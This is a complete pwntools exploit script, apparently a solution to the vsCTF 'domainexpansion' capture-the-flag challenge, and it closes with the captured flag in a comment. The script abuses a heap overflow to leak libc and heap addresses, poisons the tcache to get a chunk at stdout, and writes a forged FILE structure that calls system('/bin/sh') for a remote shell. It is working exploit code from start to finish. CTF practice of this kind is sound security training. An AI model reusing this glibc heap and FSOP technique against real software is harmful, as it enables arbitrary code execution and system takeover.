#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./domainexpansion_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe

REMOTE_NC_CMD    = "nc vsc.tf 7001"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
b *create+234
c
c
c
c
c
c
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():

    r = conn()

    def malloc(idx, size):
        r.sendline(b"1")
        r.sendline(bstr(idx))
        r.sendline(bstr(size))

    def edit(idx, data):
        r.sendline(b"2")
        r.sendline(bstr(idx))
        r.sendline(data)

    def puts(idx):
        r.sendline(b"3")
        r.sendline(bstr(idx))

    def free(idx):
        r.sendline(b"4")
        r.sendline(bstr(idx))

    def expansion(idx, size):
        r.sendline(b"260")
        r.sendline(bstr(idx))
        r.sendline(bstr(size))

    def fsrop():
        fs = FileStructure()
        fs.flags = 0x3b01010101010101
        fs._IO_read_ptr = u64(b'/bin/sh\x00')
        fs._wide_data = libc.sym['_IO_2_1_stdout_'] + 0x10
        fs._lock = libc.sym['_IO_stdfile_1_lock']
        fs.vtable = libc.sym["_IO_wstr_jumps"] + 160

        return bytes(fs) + p64(libc.sym['system']) + p64(0) + p64(libc.sym['_IO_2_1_stdout_']+0xe0-0x68)

    
    malloc(0, 0x20)
    malloc(1, 0x1000)
    malloc(2, 0x1000)
    expansion(0, 0x10000)
    free(1)
    edit(0, b"A"*0x30)
    puts(0)
    r.recvuntil(b"A"*0x30)
    leak = u64(r.recv(6)+b"\0\0")

    libc.address = leak - (libc.sym.main_arena+96)
    log.info(hex(libc.address))
    edit(0, b"A"*0x20+p64(0)+p64(0x1011)+p64(leak)*2)

    free(2)
    malloc(1, 0x100)
    malloc(2, 0x100)
    malloc(3, 0x100)

    free(1)
    
    edit(0, b"A"*0x30)
    puts(0)
    r.recvuntil(b"A"*0x30)
    heap = u64(r.recv(5)+b"\0\0\0")
    log.info(hex(heap))

    forged = libc.sym._IO_2_1_stdout_ ^ heap

    edit(0, b"A"*0x20+p64(0)+p64(0x111))

    malloc(1, 0x100)

    free(3)
    free(2)
    free(1)
    
    edit(0, b"A"*0x20+p64(0)+p64(0x111)+p64(forged))

    malloc(1, 0x100)
    malloc(2, 0x100)

    edit(2, fsrop())

    r.interactive()
    #vsctf{thr0ugh0ut_h34v3n_4nd_34rth_1_4l0n3_4m_th3_h0n0r3d_0n3}

if __name__ == "__main__":
    main()